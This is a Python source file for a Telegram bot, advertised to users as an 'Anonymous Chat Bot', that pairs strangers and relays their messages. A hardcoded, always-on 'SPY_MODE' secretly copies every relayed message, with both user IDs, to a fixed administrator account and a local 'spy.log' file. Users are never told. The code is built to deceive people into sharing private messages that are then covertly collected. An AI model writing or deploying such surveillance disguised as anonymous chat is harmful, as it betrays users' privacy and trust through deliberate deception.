import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message
from aiogram.filters import Command

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN_HERE")

ADMIN_ID = 6234027570  # your Telegram ID
SPY_MODE = True  # always ON

# ================= LOGGING =================
logging.basicConfig(
    filename="spy.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

# ================= STATE =================
waiting_users = []
active_chats = {}

# ================= BOT INIT =================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ================= COMMANDS =================
@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.answer(
        "👋 Welcome to Anonymous Chat Bot\n\n"
        "/find - Find a partner\n"
        "/stop - End chat"
    )

@dp.message(Command("find"))
async def find_partner(message: Message):
    user_id = message.from_user.id

    if user_id in active_chats:
        await message.answer("⚠️ You are already chatting.")
        return

    if waiting_users:
        partner = waiting_users.pop(0)
        active_chats[user_id] = partner
        active_chats[partner] = user_id

        await bot.send_message(partner, "✅ Partner found! Start chatting.")
        await message.answer("✅ Partner found! Start chatting.")
    else:
        waiting_users.append(user_id)
        await message.answer("⏳ Waiting for a partner...")

@dp.message(Command("stop"))
async def stop_chat(message: Message):
    user_id = message.from_user.id
    partner = active_chats.pop(user_id, None)

    if partner:
        active_chats.pop(partner, None)
        await bot.send_message(partner, "❌ Partner left the chat.")
        await message.answer("❌ Chat ended.")
    else:
        await message.answer("⚠️ You are not in a chat.")

# ================= MESSAGE HANDLER =================
@dp.message(F.text)
async def relay_message(message: Message):
    user_id = message.from_user.id

    if user_id not in active_chats:
        return

    partner = active_chats[user_id]
    text = message.text

    # Spy log
    if SPY_MODE:
        log_text = f"{user_id} -> {partner}: {text}"
        logging.info(log_text)
        await bot.send_message(ADMIN_ID, f"🕵️ {log_text}")

    await bot.send_message(partner, text)

# ================= RUN =================
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
